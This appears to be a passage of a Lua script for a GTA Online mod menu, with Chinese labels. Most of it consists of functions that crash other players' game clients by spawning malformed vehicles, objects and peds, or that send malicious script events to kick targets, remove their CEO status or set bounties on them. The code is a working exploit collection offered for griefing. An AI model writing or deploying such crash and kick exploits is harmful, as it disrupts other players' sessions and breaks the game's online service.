            gtoast("你正在让他们怒不可遏 (请稍后...)")
            menu.trigger_commands("rockcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            wait(100)
            menu.trigger_commands("flowerdance" .. PLAYER.GET_PLAYER_NAME(pid))
            wait(100)
            menu.trigger_commands("nsacrash" .. PLAYER.GET_PLAYER_NAME(pid))
            wait(100)
            menu.trigger_commands("loveclick" .. PLAYER.GET_PLAYER_NAME(pid))
            wait(100)
            menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
            gtoast("怒不可遏: 崩溃已发出")
        else
            menu.trigger_commands("rockcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("flowerdance" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("nsacrash" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("loveclick" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
            gtoast("崩溃已被用户手动停止")
        end
    end)
GTAC(other_crash, "改进的懂哥", {}, "", function()
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), p_pos.x, p_pos.y, p_pos.z,
        false, true, true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), -1087, -3012, 13.94)
    wait(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    wait(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
end)
GTAC(other_crash, "碎片崩溃", {"fragment"}, "", function()
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    entities.delete_by_handle(object)
    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"),
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    wait(1000)
    entities.delete_by_handle(object)
end)
function entity_vehicle(hash, coords, dir)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        wait()
    end
    vehicle = entities.create_vehicle(hash, coords, dir, true, false)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    return vehicle
end
GTAC(other_crash, "马哥崩溃", {"gtgvs"}, "", function()
    menu.trigger_commands("planecrash " .. players.get_name(pid))
    menu.trigger_commands("ChernobogCrash " .. players.get_name(pid) .. " 1")
    menu.trigger_commands("dh " .. players.get_name(pid))
end)
--
local all_peds_list = {"ig_siemonyetarian"}
local BrokenScenarioPeds = {"s_m_y_construct_01", "s_m_y_construct_02", "csb_janitor", "ig_russiandrunk",
                            "s_m_m_gardener_01", "s_m_y_winclean_01", "a_f_m_bodybuild_01", "s_m_m_cntrybar_01",
                            "s_m_y_chef_01", "ig_abigail"}
local BrokenScenarios = {"WORLD_HUMAN_CONST_DRILL", "WORLD_HUMAN_HAMMERING", "WORLD_HUMAN_JANITOR",
                         "WORLD_HUMAN_DRINKING", "WORLD_HUMAN_GARDENER_PLANT", "WORLD_HUMAN_MAID_CLEAN",
                         "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS", "WORLD_HUMAN_STAND_FISHING", "PROP_HUMAN_BBQ",
                         "WORLD_HUMAN_WELDING"}
local BrokenScenariosProps = {"prop_tool_jackham", "prop_tool_hammer", "prop_tool_broom", "prop_amb_40oz_02",
                              "prop_cs_trowel", "prop_rag_01", "prop_curl_bar_01", "prop_fishing_rod_01",
                              "prop_fish_slice_01", "prop_weld_torch", "p_amb_coffeecup_01"}
--
local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end
--
GTAC(updates, "宵宵古今", {"reol"}, "流星&堕落", function()
    reolcrash(pid)
    menu.trigger_commands("12crash" .. PLAYER.GET_PLAYER_NAME(pid))
end)
--
diudiuflower = GT(updates, "猛女散花", {"diudiucrash"}, "")
GTAC(diudiuflower, "猛女散花", {"diudiuevil"}, "针对个人玩家\n不建议一直按住", function()
    menu.trigger_commands("givesh" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("ghostv6" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("ghostv8" .. PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(diudiuflower, "猛女散花(全局版本)", {"diudiuevilall"}, "全局崩溃版本\n不建议一直按住",
    function()
        menu.trigger_commands("givesh" .. PLAYER.GET_PLAYER_NAME(pid)) -- Let Player Become Scripts Host to Manager Event
        menu.trigger_commands("ghostv8" .. PLAYER.GET_PLAYER_NAME(pid)) -- Crash Event(XQ) & MP Freemode 01 Ped Spawner
        menu.trigger_commands("12crash" .. PLAYER.GET_PLAYER_NAME(pid)) -- Freemode Entity Control Spawner (Taxi Ped)
        menu.trigger_commands("chokeall") -- Command For Stand Crash All (C2)
        menu.trigger_commands("sixfeel") -- Invalid Object Crash (Prevent Youself)
    end)
GTAC(updates, "雨落纷纷", {"rainfell"},
    "如今的瓢泼大雨比以往更加强烈\n你仍然可以站在GTVIP的雨伞之下", function()
        local edition = menu.get_edition()
        if edition == 3 then
            gtoast("再见")
            menu.trigger_commands("umbrella" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("ghostv3" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("ghostv4" .. PLAYER.GET_PLAYER_NAME(pid))
        elseif edition == 0 then
            gtoast("您是免费版用户，我还能说什么呢")
        elseif edition == 1 then
            gtoast("您是基础版用户，该崩溃仅在终极版可用")
        elseif edtion == 2 then
            gtoast("您是常规版用户，该崩溃仅在终极版可用")
        end
    end)
--
GTAC(updates, 'NSA崩溃', {"nsacrash"}, '', function()
    ped_task = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED(pid), true)
    entities.create_object(0x9cf21e0f, ped_task, true, false)
    local Rui_task = CreateVehicle(util.joaat("Ruiner2"), ped_task, ENTITY.GET_ENTITY_HEADING(TTPed), true)
    local ped_task2 = CreatePed(26, util.joaat("ig_kaylee"), ped_task, 0)
    for i = 0, 10 do
        local pedps = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local allpeds = entities.get_all_peds_as_handles()
        local allvehicles = entities.get_all_vehicles_as_handles()
        local allobjects = entities.get_all_objects_as_handles()
        local ownped = players.user_ped(players.user())
        request_model(0x78BC1A3C)
        request_model(0x000B75B9)
        request_model(0x15F27762)
        request_model(0x0E512E79)
        CreateVehicle(0xD6BC7523, pedps, 0)
        CreateVehicle(0x1F3D44B5, pedps, 0)
        CreateVehicle(0x2A72BEAB, pedps, 0)
        CreateVehicle(0x174CB172, pedps, 0)
        CreateVehicle(0x78BC1A3C, pedps, 0)
        CreateVehicle(0x0E512E79, pedps, 0)
        for i = 1, #allpeds do
            if allpeds[i] ~= ownped then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allpeds[i], 0, 0, 0)
            end
        end
        for i = 1, #allvehicles do
            if allvehicles[i] ~= ownvehicle then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehicles[i], 0, 0, 0)
                VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(allvehicles[i], 0, 0, 0)
                VEHICLE.SET_TAXI_LIGHTS(allvehicles[i])
            end
        end
        for i = 1, #allobjects do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allobjects[i], 0, 0, 0)
        end
        wait()
    end
    PED.RESURRECT_PED(players.user_ped(pid))
    wait(2000)
    entities.delete_by_handle(Rui_task)
    entities.delete_by_handle(ped_task2)
end)
GTAC(updates, '彩色泡泡', {"rainbowpapaw"}, '', function(f)
    player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    veh = entities.get_all_vehicles_as_handles()
    for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], 0, 0, 5)
        TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 18, 777)
        TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 17, 888)
        TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 16, 999)
    end
end)
GTAC(updates, '花神之舞', {"flowerdance"}, '', function(f)
    plauuepos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    plauuepos.x = plauuepos.x + 1.2
    plauuepos.z = plauuepos.z - 0.5
    hunter = {}
    for i = 1, 3 do
        for n = 0, 120 do
            hunter[n] = CreateVehicle(-692292317, plauuepos, 0)
            wait(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n], true)
            wait(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        wait(190)
        for i = 1, #hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    gtoast("崩溃已结束")
    hunter = nil
    plauuepos = nil
end)
GTAC(updates, "支离破碎", {"lettingbreak"}, "GRANDTOURINGVIP\n2Take1版本同款崩溃",
    function(f) -- 增加部分模型
        local vehs = {}
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local m = {"dubsta", "dubsta2", "fq2", "patriot", "radi", "habanero", "landstalker", "serrano", "cavalcade",
                   "rocoto", "GRANGER", "Baller", "gresley", "baller2", "cavalcade2", "MESA", "Seminole", "BjXL",
                   "mesa2", "huntley", "toros", "squaddie", "rebla", "baller3", "baller4", "baller5", "baller6", "xls",
                   "xls2", "contender", "patriot2", "Novak", "landstalker2", "seminole2", "iwagen", "astron", "baller7",
                   "jubilee", "granger2"}
        for i = 1, #m do
            local h = util.joaat(m[i])
            gtoast(h)
            STREAMING.REQUEST_MODEL(h)
            while not STREAMING.HAS_MODEL_LOADED(h) do
                wait(0)
            end
            c.z = c.z + 1.0
            vehs[i] = CreateVehicle(h, c, 0, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(h)
        end
        while f do
            for i = 1, #vehs do
                ENTITY.SET_ENTITY_VISIBLE(vehs[i], false)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 0, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 1, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 2, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 3, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 4, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 5, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 6, true)
                VEHICLE.SET_DOOR_ALLOWED_TO_BE_BROKEN_OFF(vehs[i], 7, true)
                wait(0)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 0, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 1, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 2, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 3, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 4, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 5, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 6, false)
                VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehs[i], 7, false)
            end
            wait(100)
            for i = 1, #vehs do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehs[i])
                VEHICLE.SET_VEHICLE_FIXED(vehs[i])
            end
            wait(100)
        end
        for i = 1, #vehs do
            entities.delete_by_handle(vehs[i])
        end
    end)
GTAC(updates, '销声割迹', {}, '', function(f)
    local model_array<const> = {0x58f77553, 0x1446590a}
    local pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    pos.x = pos.x + 3
    local ped_<const> = CreatePed(26, util.joaat("ig_kaylee"), pos, 0)
    for spawn, vel in pairs(model_array) do
        local ves<const> = {}
        ves[spawn] = CreateVehicle(vel, pos, 0)
        for key, value in pairs(ves) do
            PED.SET_PED_INTO_VEHICLE(ped_, value, -1)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, value, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 1, 1, 100, 10, 1)
        end
    end
    wait(2000)
    local vels_<const> = entities.get_all_vehicles_as_handles()
    for delete, value in pairs(vels_) do
        entities.delete_by_handle(value)
        entities.delete_by_handle(ped_)
    end
    if f then
        local position<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        position.x = position.x + 3
        local sb_ped<const> = CreatePed(26, util.joaat("a_c_rat"), position, 0)
        local crash_plane<const> = CreateVehicle(0x9c5e5644, position, 0)
        PED.SET_PED_INTO_VEHICLE(sb_ped, crash_plane, -1)
        PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), crash_plane, -1)
        ENTITY.FREEZE_ENTITY_POSITION(crash_plane, true)
        local time<const> = util.current_time_millis() + 2000
        TASK.TASK_OPEN_VEHICLE_DOOR(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), crash_plane, 9999, -1, 2)
        while time > util.current_time_millis() do
            TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
            wait(5)
        end
        entities.delete_by_handle(sb_ped)
    end
    if f then
        local positions<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local rat<const> = CreatePed(26, util.joaat("a_c_rat"), positions, 0)
        ENTITY.SET_ENTITY_VISIBLE(rat, false)
        local obs<const> = OBJECT.CREATE_OBJECT_NO_OFFSET(1888301071, 3, 0, 0, true, false)
        local time<const> = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            TASK.TASK_CLIMB_LADDER(rat)
            wait(100)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(rat)
        end
        if f then
            local position<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            position.x = position.x + 3
            local model = {util.joaat("cs_wade"), util.joaat("a_c_rat")}
            for _spawn, value in pairs(model) do
                local task_crash = {}
                task_crash[_spawn] = CreatePed(26, value, position, 0)
                ENTITY.FREEZE_ENTITY_POSITION(task_crash[_spawn], true)
                for start, value1 in pairs(task_crash) do
                    local play = {}
                    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(value1, util.joaat("weapon_pistol"), 0, true)
                    wait(200)
                    play[start] = MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 0.1, pos.x, pos.y,
                        pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 100)
                    wait(500)
                    ENTITY.FREEZE_ENTITY_POSITION(value1, false)
                end
                wait(2000)
                entities.delete_by_handle(value)
            end
        end
    end
end)
GTLP(updates, "地铁头", {}, "", function()
    menu.trigger_commands("rainbowpapaw" .. PLAYER.GET_PLAYER_NAME(pid))
    wait(100)
    menu.trigger_commands("flowerdance" .. PLAYER.GET_PLAYER_NAME(pid))
    wait(100)
    menu.trigger_commands("lettingbreak" .. PLAYER.GET_PLAYER_NAME(pid))
    wait(200)
    menu.trigger_commands("superc")
end)
--[[GTAC(updates, "OG崩溃", {}, "", function()
    ogcrash(pid)
end)
GTAC(updates, "小苏专属崩溃", {}, "", function()
    local stupid_pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    stupid_pos.y = stupid_pos.y - 2
    local mod_vel = {-692292317, 184361638, 642617954, 586013744}
    for _spawn, value in pairs(mod_vel) do
        local s = {}
        for i = 1, 10, 1 do
            s[_spawn] = CreateVehicle(value, stupid_pos, 0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
            wait(0)
        end
    end
    wait(100)
    local ar_vs = entities.get_all_vehicles_as_handles()
    for key, value in pairs(ar_vs) do
        entities.delete_by_handle(value)
    end
    menu.trigger_commands("nofuckoff" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
end)]]
GTAC(other_crash, "GT崩溃", {}, "", function()
    gtcrash(pid)
end)
GTAC(PlayerMainMenu, "复制名称", {''}, "", function(state)
    local r_id = PLAYER.GET_PLAYER_NAME(pid)
    util.copy_to_clipboard(r_id)
end)
GTAC(PlayerMainMenu, "复制RID", {''}, "", function(state)
    local rid = players.get_rockstar_id(pid)
    util.copy_to_clipboard(rid)
end)
GTAC(PlayerMainMenu, "传送到玩家", {""}, "", function()
    tpplayer(pid)
end)
sply4 = GTLP(PlayerMainMenu, "持续传送到玩家", {""}, "", function()
    if players.user() == pid then
        gtoast("不能对自己使用")
        menu.set_value(sply4, false)
    else
        tpplayer(pid)
        wait(500)
    end
end)
local playerMain = GT(GTROOT, "恶搞选项", {"GTTrolling"}, "无恶不作,无所不为", function()
    local focused = players.get_focused()
    if #focused > 0 and menu.is_open() and (players.get_spectate_target(players.user()) ~= focused[1]) then
        local pid = focused[1]
        if pid ~= cur_focused_player then
            if not cur ~= 0 then
                entities.delete(cur)
            end
            cur_focused_player = pid
        end
        local name = PLAYER.GET_PLAYER_NAME(pid)
        for _, id in ipairs(spid) do
            if name == id.playerid then
                if name ~= "RhymeBear" then
                    gtoast("你无法对皇榜用户使用任何攻击功能")
                    menu.trigger_commands("GTProt" .. name)
                end
            end
        end
    end
end)
extra_malice = GT(playerMain, "恶意事件")
extra_malice:action("给予贿赂警察", {}, "", function()
    local rpd1 = memory.read_int(memory.script_global(pid * 610 + 1887306 + 512))
    util.trigger_script_event(1 << pid ,{-305178342, util.current_unix_time_seconds() + -60, util.current_unix_time_seconds(), players.user(), 0, 0, rpd1})
end)
extra_malice:action("移除CEO", {}, "", function()
    local rpd1 = memory.read_int(memory.script_global(pid * 610 + 1887315 + 11))
    local rpd2 = memory.read_int(memory.script_global(pid * 610 + 1887306 + 10 + 11))
    util.trigger_script_event(1 << pid ,{-11681548, pid, rpd1})
    util.trigger_script_event(1 << pid ,{-11681548, pid, rpd2})
end)
extra_malice:action("给予人间蒸发", {}, "", function()
    local rpd1 = memory.read_int(memory.script_global(pid * 610 + 1887306 + 512))
    util.trigger_script_event(1 << pid ,{57493695, util.current_unix_time_seconds() + -60, util.current_unix_time_seconds(), 0, 1, 0, rpd1})
    util.trigger_script_event(1 << pid ,{57493695, 0, util.current_unix_time_seconds() - 160, util.current_unix_time_seconds(), 0, 1, 0, rpd1})
end)
extra_malice:action("发送悬赏", {}, "", function()
    local rpd1 = memory.read_int(memory.script_global(1916626))
    local rpd2 = memory.read_int(memory.script_global(1916627))
    util.trigger_script_event(1 << pid ,{1517551547, players.user(), pid, pid, 10000, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, rpd1, rpd2})
end)
extra_malice:action("踢到邀请战局", {}, "", function()
    local rpd = memory.read_int(memory.script_global(pid * 883 + 1845316 + 268))
    util.trigger_script_event(1 << pid ,{-1321657966, players.user(), -1, -1, rpd, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid ,{-1321657966, players.user(), -1, -1, rpd, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid ,{-1321657966, players.user(), 24, 1, 0, 115, 1, 1, 1})
    util.trigger_script_event(1 << pid ,{-1321657966, players.user(), 1, 1, -1, 4, -1, 0, 0, 0})
end)
extra_malice:action("麦克错误踢出", {}, "", function()
    util.trigger_script_event(1 << pid ,{-642704387, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 599))})
    wait(300)
    util.trigger_script_event(1 << pid ,{-642704387, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 600))})
    wait(300)
    util.trigger_script_event(1 << pid ,{-642704387, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 511))})
    wait(300)
    util.trigger_script_event(1 << pid ,{288412940, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 511))})
    wait(300)
    util.trigger_script_event(1 << pid ,{288412940, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 400))})
    wait(300)
    util.trigger_script_event(1 << pid ,{288412940, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 401))})
    wait(300)
    util.trigger_script_event(1 << pid ,{288412940, pid, players.user(), memory.read_int(memory.script_global(pid * 610 + 1 + 1887305 + 402))})
    util.trigger_script_event(1 << pid ,{-642704387, pid, players.user(), 16777216, 782258655, math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), 24, math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807)})
    util.trigger_script_event(1 << pid ,{-642704387, pid, players.user(), 16777216, 782258655, math.random(-9223372036854776000, -999994894), math.random(-9223372036854776000, -999994894), math.random(-9223372036854776000, -999994894), math.random(-9223372036854776000, -999994894), math.random(-9223372036854776000, -999994894), math.random(-9223372036854776000, -999994894), math.random(999994894, 9223372036854775807), 24, math.random(-9223372036854776000, -999994894), math.random(999994894, 9223372036854775807), math.random(999994894, 9223372036854775807)})
end)
extra_malice:action("修复黑屏", {}, "", function()
    CAM.DO_SCREEN_FADE_IN(0)
    PLAYER.SET_PLAYER_CONTROL(players.user_ped(), true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
    MISC.FORCE_GAME_STATE_PLAYING()
    if PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true) == 0 then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    end
    HUD.DISPLAY_RADAR(true)
    HUD.DISPLAY_HUD(true)
end)
updatetroll = GT(playerMain, "近期更新", {}, "")
GTTG(updatetroll, '控制无敌', {}, '', function(w)
    on = w
    while on do
        wait()
        pidp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        PED.SET_PED_MAX_HEALTH(pidp, 10999999)
        ENTITY.SET_ENTITY_HEALTH(pidp, 10999999)
        PLAYER.SET_PLAYER_MAX_ARMOUR(pidp, 10999999)
        PED.SET_PED_ARMOUR(pidp, 10999999)
        ENTITY.SET_ENTITY_INVINCIBLE(pidp, true)
        PED.CLEAR_PED_BLOOD_DAMAGE(pidp)
        ENTITY.SET_ENTITY_PROOFS(pidp, false, false, false, false, false, false, 1, false)
    end
    pidp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    PED.SET_PED_MAX_HEALTH(pidp, 328)
    ENTITY.SET_ENTITY_HEALTH(pidp, 328)
    PLAYER.SET_PLAYER_MAX_ARMOUR(pidp, 328)
    PED.SET_PED_ARMOUR(pidp, 328)
    ENTITY.SET_ENTITY_INVINCIBLE(pidp, false)
    ENTITY.SET_ENTITY_PROOFS(pidp, true, true, true, true, true, true, 1, true)
end)
GTAC(updatetroll, "碰撞错乱", {}, "停不下来但很难被防御", function(statsF)
    stats = statsF
    if stats then
        objtrolls1 = spawn_object(joaat("prop_cablespool_02"), players.get_position(pid), true)
    end
    while stats do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(objtrolls1, players.get_position(pid).x, players.get_position(pid).y, players.get_position(pid).z)
        ENTITY.SET_ENTITY_ROTATION(objtrolls1, math.random(0, 360), math.random(0, 360), math.random(0, 360))
        ENTITY.SET_ENTITY_VISIBLE(objtrolls1, false)
        if entities.get_owner(objtrolls1) ~= players.user() then
            notification("发生错误,如果问题仍然存在,请更改战局.")
            stats = false
        end
        wait()
    end
    if not stats then
        entities.delete_by_handle(objtrolls1)
    end
end)
GTAC(updatetroll, "偷取货物", {}, "", function()
    Delete_Ped_Paparazzi_Crash = true
    local PedCrash1, PedCrash2 <const> = {}, {}
    for i = 1, 20 do
        local pos1 <const> = players.get_position(pid)
        PedCrash1[i] = CreatePed(-1, joaat("CS_Stretch"), v3(pos1.x + 110, pos1.y, 2600), math.random(0, 360))
        PedCrash2[i] = CreatePed(-1, joaat("MP_F_DeadHooker"), v3(pos1.x + 110, pos1.y, 2600), math.random(0, 360))
        for i in ipairs(PedCrash1) do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PedCrash1[i], pos1.x + 110, pos1.y, 2600)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PedCrash2[i], pos1.x + 110, pos1.y, 2600)
        end
        wait(250)
    end
    local time <const> = util.current_time_millis() + 3000
    while time > util.current_time_millis() do
        for i in ipairs(PedCrash1) do
            local pos1 <const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0, 50.0, -1.65)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PedCrash1[i], pos1.x, pos1.y, pos1.z)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PedCrash2[i], pos1.x, pos1.y, pos1.z)
        end
        wait()
    end
    for i in ipairs(PedCrash1) do
        entities.delete_by_handle(PedCrash1[i])
        entities.delete_by_handle(PedCrash2[i])
    end
    Delete_Ped_Paparazzi_Crash = false
    notification(PLAYER.GET_PLAYER_NAME(pid) .. " 货物偷取完毕")
end)
function get_free_seat(veh) -- 获取载具空位
	local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(veh))
